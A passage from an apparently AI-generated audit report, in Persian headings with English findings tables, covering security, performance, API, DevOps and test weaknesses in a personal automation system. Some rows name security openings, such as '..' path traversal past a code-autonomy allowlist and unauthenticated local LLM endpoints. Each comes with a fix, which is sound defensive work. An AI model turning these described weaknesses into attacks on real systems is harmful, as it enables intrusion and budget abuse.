| CWE-1357 | `F:\backup\_launchpad\second-brain-live\START-HERE.bat:14-19` | Zero lockfiles in the entire codebase + unbounded upper bounds + auto-install on first run = dependency set is | Freeze what is currently known-good and commit it: `pip freeze > requirements |
| CWE-829 | `F:\backup\_launchpad\second-brain-live\START-HERE.bat:14-19` | Batch installers have no errorlevel guard after venv creation — a failed `python -m venv` silently redirects p | Add an errorlevel guard so the script cannot fall through to a global install |
| OCT-DEPS-5 | `F:\backup\app\pyproject.toml:17 vs F:\backup\4d_system\pyproject.toml:` | Divergent duplicate manifests: app/pyproject.toml is a stale twin of 4d_system/pyproject.toml under the same n | Sync the constraint line — copy `api = ["fastapi>=0 |
| OCT-DB-04 | `F:/backup/_ops/chrono.py:201 (DDL that omits it) + F:/backup/_ops/chro` | live chrono.db carries an orphan gated_effect.idempotency_key column + UNIQUE index that no code creates, read | Add versioning to ChronoDB |
| OCT-DB-05 | `F:/backup/_ops/chrono.py:626` | chrono.db grows 3 rows per beat forever: no retention, no pruning, no VACUUM anywhere in the tree | Add a retention sweep to beat_once, cheap because beat_seq is the primary key and monotonic — every ~1440 beats (reuse t |
| OCT-DB-06 | `F:/backup/_ops/organism.py:348 (connection per tick) + F:/backup/_ops/` | sweep opens a fresh connection + re-runs the full DDL every tick instead of reusing the open handle, then issu | Collapse the N+1 into the single statement SQLite already supports — read the ids for the audit note, then `UPDATE gated |

### محور 2 — امنیت (7 مورد Low)

| ID | موقعیت | مشکل | راه‌حل فوری |
|---|---|---|---|
| OCT-AUTHZ-4 | `F:\backup\_ops\cortex\cortex.py:376` | cortex POST /ask (8772) and live POST /api/ask (8773) expose the paid LLM to any unauthenticated local caller  | Require the same per-boot bearer token on both /ask routes and require Content-Type: application/json |
| CWE-22 | `F:\backup\_ops\cortex\code_autonomy.py:88` | code_autonomy.allowed_target() is substring-based and blind to `..` — the Heart Law §3 allowlist can be walked | Normalise and anchor before deciding, at code_autonomy |
| CWE-526 | `F:\backup\_ops\cortex\code_autonomy.py:129` | Code-autonomy shadow/canary runner executes LLM-proposed patch code with the full unscrubbed environment (all  | Replace `env = dict(_os |
| CWE-22 | `F:\backup\_ops\cortex\code_autonomy.py:88` | code-autonomy write guard allowed_target() accepts "../": substring allowlist with no path normalization, so t | Anchor the allowlist and reject traversal in allowed_target (code_autonomy |
| OCT-SUPPLY-2 | `F:\backup\_ops\budget\opslib.py:201 (+ F:\backup\_ops\RUN-ORGANISM.bat` | The live organism runs on the ambient system Python with undeclared, unpinned numpy + PyYAML — _ops/ has no re | Declare what is actually imported |
| CWE-494 | `F:\backup\03 - Projects\Mining\03 - Rigs\Mining-1\Hcash\02_install_min` | Hacash fullnode/miner binaries are curl'd, chmod +x'd and run as systemd User=root with zero checksum or signa | Add a digest gate between curl and chmod |
| OCT-SUPPLY-4 | `F:\backup\03 - Projects\Mining\02 - Code\Ai bots\deploy\setup_worker.s` | setup_worker.sh installs the XMRig release tarball with no SHA256SUMS check and builds cpuminer-multi from an  | Verify the tarball before unpacking it, using the checksums upstream already ships:   wget -q "$URL" -O /tmp/xmrig |

### محور 3 — عملکرد و پایداری (21 مورد Low)

| ID | موقعیت | مشکل | راه‌حل فوری |
|---|---|---|---|
| OCT-PERFCACHE-2 | `F:\backup\_ops\wiring.py:2060` | Discovery-nudge anti-spam epoch is in-memory only while its key (beat) is restored from sqlite — every organis | Give discovery_nudge_beat the persistence its sibling already has: write `{"last_epoch": epoch}` to `opslib |
| OCT-PERFCACHE-3 | `F:\backup\_ops\cortex\discoveries.py:71` | discoveries seen-watermark marks everything read even though only 8 items within a 72h window are ever display | Watermark only what was actually rendered |
| OCT-PERFCACHE-6 | `F:\backup\_ops\live\server.py:312` | Registry TTL cache has no stampede guard: concurrent requests to the threaded HTTP server all miss together an | Wrap the recompute in a module-level threading |
| OCT-OBSERV-1 | `F:\backup\_ops\wiring.py:1954 (gate) · F:\backup\_ops\organism.py:556 ` | The only proactive push notifier lives inside the body's beat loop and disables itself when the body stops; th | Give the cortex the push it structurally needs: in cortex |
| OCT-OBSERV-2 | `F:\backup\04 - Architect System\scripts\organism-watchdog.ps1:10,12-14` | watchdog.log is write-only — 16 unplanned deaths silently revived, 0 notifications, and the 'supervision gave  | In organism-watchdog |
| OCT-PERF-2 | `F:\backup\_ops\cortex\cortex.py:376-390 (inline call at :385)` | cortex POST /ask runs the full LLM router inline on the request thread with no total deadline — four stacked 1 | Add a deadline to the router and check it between hops: give model_router |
| OCT-PERFCACHE-1 | `F:\backup\_ops\budget\opslib.py:193` | budgets.yaml is cached for the life of the process and never invalidated — lowering the monthly spend cap is a | Make the cache mtime-keyed, mirroring the already-correct pattern in this same codebase (events |
| OCT-PERFCACHE-4 | `F:\backup\_ops\telegram_center\center.py:558` | The constitution's "telegram pipeline is idempotent via message_id" claim has no implementation; the real dedu | Correct the doctrine to describe what is real — dedup is update_id/last_offset in telegram_center/center |
| OCT-RESIL-2 | `F:\backup\04 - Architect System\scripts\organism-watchdog.ps1:64-70 (w` | Watchdog cortex cap is fail-OPEN on tracker write failure: empty `catch {}` lets the revive proceed while the  | Invert the order and gate on success: write the tracker FIRST, and only `Start-Process` if the write succeeded — `try {  |
| OCT-RESIL-4 | `F:\backup\03 - Projects\اونلی فنز\langar\langar_bot.py:607-612 (mark-b` | langar_bot: weekly tick marks itself done BEFORE doing the work — a swallowed send error silently discards the | Move the marker after the work and make it conditional on success: have send() return a bool (True on 200, False in the  |
| OCT-RESIL-5 | `F:\backup\03 - Projects\اونلی فنز\langar\langar_bot.py:637-639 (fixed ` | langar_bot: outbound Telegram has no retry and no backoff — fixed 5s sleep turns a 401/429 into an unbounded h | Replace the flat sleep with capped exponential backoff and stop retrying unauthenticated errors — track consecutive fail |
| OCT-OBSERV-3 | `F:\backup\_ops\cortex\cortex.py:61-66 (STOP-gated consumer) · cortex.p` | coherence/stale_members have no threshold alert anywhere; every opslib.alert call in cortex.py is an exception | In cortex |
| OCT-OBSERV-4 | `F:\backup\_ops\cortex\registry.py:59-68 (mtime-only sweep) · F:\backup` | coherence cannot distinguish an owner-initiated STOP from a crash — an intentional halt fires a false 'low coh | Thread intent into the sensor: in registry |
| OCT-OBSERV-5 | `F:\backup\_ops\budget\opslib.py:54,338-341 (sink) · F:\backup\_ops\cor` | Alert sink is a single undifferentiated append-only file (194 call sites, one ⚠️ level, 87% duplicates incl. 6 | Two small changes |
| OCT-PERF-1 | `F:\backup\_ops\chrono.py:263 (declaration) and F:\backup\_ops\chrono.p` | chrono LegHandle.inbox is an unbounded write-only deque — every heartbeat is retained in RAM forever with zero | One-token diff at chrono |
| OCT-PERF-2 | `F:\backup\_ops\budget\opslib.py:274-277 (primitive)` | opslib.append_jsonl — the shared append primitive behind 17 sinks — has no size cap or rotation, while the cod | Add a size guard inside `append_jsonl` (opslib |
| OCT-PERF-3 | `F:\backup\_ops\events.py:180-192 (_all) and F:\backup\_ops\events.py:2` | events._all() re-reads and re-parses the entire events.jsonl on every accessor — one dashboard poll triggers ~ | Two independent minimal diffs |
| OCT-PERF-4 | `F:\backup\4d_system\config\settings.py:65-79 (setup_logging)` | 4d_system installs a plain logging.FileHandler on the ROOT logger with no rotation — measured 7.9 MB/day, ~150 | One-line swap at settings |
| OCT-RESIL-1 | `F:\backup\04 - Architect System\scripts\organism-watchdog.ps1:36-43 (u` | Watchdog crash-loop cap protects the brain (cortex/8772) but NOT the body (organism/8771) — 13 uncapped reviva | Copy the cortex tracker block to the organism branch: reuse the same $track/6h/3-attempt pattern against a new _ops\stat |
| OCT-RESIL-3 | `F:\backup\03 - Projects\اونلی فنز\langar\langar_bot.py:624-626 (unguar` | langar_bot: maybe_weekly() is called OUTSIDE the poll loop's try/except and reaches uncaught file I/O — one EN | Move the call inside the guard — put `self |
| OCT-OBSERV-6 | `F:\backup\_ops\cortex\cortex.py:275-332 (run_cycle, no context) · F:\b` | Cortex never opens a run context, so every event from a cortex cycle mints a fresh unrelated correlation_id —  | Mirror organism |

### محور 4 — API و Integration (13 مورد Low)

| ID | موقعیت | مشکل | راه‌حل فوری |
|---|---|---|---|
| OCT-API-2 | `F:\backup\_ops\dashboard\server.py:883-903 (msg discarded at :895-899,` | POST /save computes its result message (including restart-failure errors) and discards it — a failed restart r | Stop discarding the outcome |
| OCT-API-6 | `F:\backup\_ops\organism.py:118-119` | Four different 404 response shapes across five servers; two send a body with no Content-Type, one mislabels a  | Give each server one _not_found() helper emitting a uniform envelope — status 404, Content-Type application/json; charse |
| OCT-API-3 | `F:\backup\_ops\cortex\model_router.py:148-156 (fall-through) — throttl` | A 20-second GPU hardware throttle silently escalates to the PAID API: local_llm returns None when rate-limited | Make the throttle wait instead of surrender, or make it distinguishable |
| OCT-API-4 | `F:\backup\_ops\cortex\model_router.py:162-170 (escalation order + earl` | Router silently escalates a cheap-tier request to the ~13x-priced model and records no fallback marker, so the | Set the marker before the early return so escalation is always visible: at model_router |
| OCT-API-3 | `F:\backup\_ops\cortex\cortex.py:355-362` | /api/journal is the only prefix-matched route in the system — it shadows any future /api/journal* sibling and  | Change cortex/cortex |
| OCT-API-4 | `F:\backup\_ops\panel\server.py:535-561 (catch-all at :557-561)` | panel (:8790) has no GET 404 at all — every unknown path returns 200 with an HTML form, including probes for J | Add a terminal 404 to panel/server |
| OCT-API-1 | `F:\backup\04 - Architect System\scripts\budget_gate.py:84 (setdefault)` | Monthly budget halt latches permanently: _roll() never clears `halted`, so hitting the routine AU$30 cap kills | In _roll(), clear the routine latch on month change while preserving the disaster latch |
| OCT-API-2 | `F:\backup\_ops\cortex\cortex.py:385 (max_tokens unclamped) — reached v` | Cortex /ask accepts caller-controlled unbounded max_tokens with no auth and no Origin check, inflating the bud | Clamp max_tokens at the handler: `max_tokens=max(1, min(int(body |
| OCT-API-1 | `F:\backup\_ops\live\server.py:293-309 (URL at :298, swallow at :304, f` | live→cortex /ask proxy hardcodes the path and fails OPEN to a different backend with a different max_tokens, s | Pass the token budget explicitly so both branches agree, and stop swallowing contract errors: in live/server |
| OCT-API-5 | `F:\backup\_ops\organism.py:85-90` | Zero versioning across all 21 local routes, and the JSON namespace convention is broken by exactly two endpoin | Do NOT add /v1 to everything — that is churn with no consumer to protect |
| OCT-API-3 | `F:\backup\_ops\legs\lead_sense.py:86` | lead_sense.read_inbox validates only `description`, admitting untyped numeric fields that permanently stall le | Extend the validation in read_inbox to the fields the contract already documents, so a bad candidate is quarantined to r |
| OCT-API-5 | `F:\backup\04 - Architect System\scripts\budget_gate.py:51-53 (_save) a` | budget_gate._save() writes the money source-of-truth non-atomically; a crash mid-write corrupts it and settle( | Make _save atomic using the exact pattern from approval_channel |
| OCT-API-6 | `F:\backup\_ops\budget\approval_channel.py:333-334` | Telegram offset is persisted only after the whole batch is dispatched, and there is no per-update_id dedup led | Flush the offset per update rather than per batch: move the `_save_offset(self |

### محور 5 — DevOps و Infra (3 مورد Low)

| ID | موقعیت | مشکل | راه‌حل فوری |
|---|---|---|---|
| OCT-DEVOPS-1 | `F:\backup\_ops\organism-watchdog.ps1:11` | Watchdog split-brain is INVERTED from its own documentation: Windows runs the 'scripts/' twin, while the '_ops | Point the existing guard at the file that actually runs |
| OWASP-A08 | `F:\backup\.claude\settings.local.json:6` | No commit-time gate of any kind (no CI, no git hook, no pre-commit) while `git add`/`git commit` are pre-appro | Add one repo-local pre-commit hook and point git at it (no new dependency, no network, ~20 lines):   git config core |
| OWASP-A06 | `F:\backup\survival-gateway\docker-compose.yml:15` | docker-compose.yml comment claims the LiteLLM image is 'PINNED' as supply-chain mitigation, but the image uses | Pin by immutable digest instead of a rolling tag, so the pull is reproducible and a re-pointed tag cannot silently chang |

### محور 6 — DX و نگهداری (11 مورد Low)

| ID | موقعیت | مشکل | راه‌حل فوری |
|---|---|---|---|
| OCT-DXTESTS-1 | `F:\backup\_ops\tests\run_all.py:83` | Registered test file does not exist -> run_all.py can never be green -> capability marker permanently revoked, | Delete the string "test_baseline_money_fingerprint |
| CWE-754 | `F:\backup\_ops\tests\test_frontier.py:132` | Money capability-gate test can only pass: it imports capability_gate.check, which does not exist; the ImportEr | At F:\backup\_ops\tests\test_frontier |
| OCT-DXTESTS-3 | `F:\backup\_ops\tests\test_phase2_scheduler.py:43` | Assertion-free tests: `t_dispatcher_is_propose_only` swallows every exception and ends in `assert True`, verif | In F:\backup\_ops\tests\test_phase2_scheduler |
| OCT-DXTESTS-5 | `F:\backup\_ops\tests\run_all.py:176` | No coverage measurement exists anywhere in the tree and there is no CI — coverage is UNKNOWN, so the 189-file  | Measure once, then decide — do not add a gate yet: `pip install pytest-cov`, then run the suite with COVERAGE_PROCESS_ST |
| OCT-DXDOC-1 | `F:\backup\_ops\organism-watchdog.ps1:11-22` | SPLIT-BRAIN comment in _ops/organism-watchdog.ps1 asserts the exact inverse of reality: it names itself the ru | Comment-only edit, zero behavior change: rewrite _ops/organism-watchdog |
| OCT-DXDOC-4 | `F:\backup\_ops\organism-watchdog.ps1:6` | Documented revival latency is 3x optimistic: docs promise '/MO 5' and 'احیای ≤۵ دقیقه', registered reality is  | Correct the interval in all three places to the registered truth (PT15M): _ops\organism-watchdog |
| OCT-DXDOC-2 | `F:\backup\_ops\tests\test_heart_work.py:131-141` | The only watchdog test asserts against the dead _ops twin, giving green-lie coverage; the live watchdog — incl | Repoint line 133 to the registered file: `ps1 = Path(__file__) |
| OCT-DXDOC-3 | `F:\backup\04 - Architect System\octopus-build-prompts\HH-P9-ALWAYS-ON-` | Onboarding docs instruct the owner to register OCTOPUS-Watchdog against the dead _ops file — following them wo | Strike the two schtasks lines from HH-P9-ALWAYS-ON-AUTONOMY |
| OCT-DXDOC-5 | `F:\backup\_ops\RUN-CORTEX.bat:4-5` | Docs promise 'laptop on = automatic birth' via two ONLOGON tasks; neither is registered, so a Windows restart  | Owner decision, not an agent action (schtasks = 'important' tier per the autonomy matrix): either register the two ONLOG |
| OCT-DXDOC-6 | `F:\backup\06 - Architecture Maps\_Index - Architecture Maps.md:38` | The append-only decision register froze at D-37 on 2026-07-09 while major decisions kept shipping; the sole AD | Three appends, no restructuring: (1) add D-38 (autonomy re-tier 2026-07-16 → AUTONOMY-MATRIX-2026-07-16 |
| OCT-DXTESTS-6 | `F:\backup\_ops\tests\test_drawdown_enforcer.py:24` | Four phantom test files rot on disk excluded only by a code comment; test_mining_wiring.py exits 0 silently, s | Add PYTEST_TESTS classification to the orphan-adoption ritual: before registering any file, check whether it defines `de |

---

> **پایان گزارش.** منبعِ داده: workflow `wf_35e72243-6ad` · ۳۰۵ ایجنت · ۲۳.۵M توکن · ۲۱ محور × ۳ عدسیِ خصمانه · ۸۴ تأیید / ۱۰ رد / ۲ شکافِ منتقد.
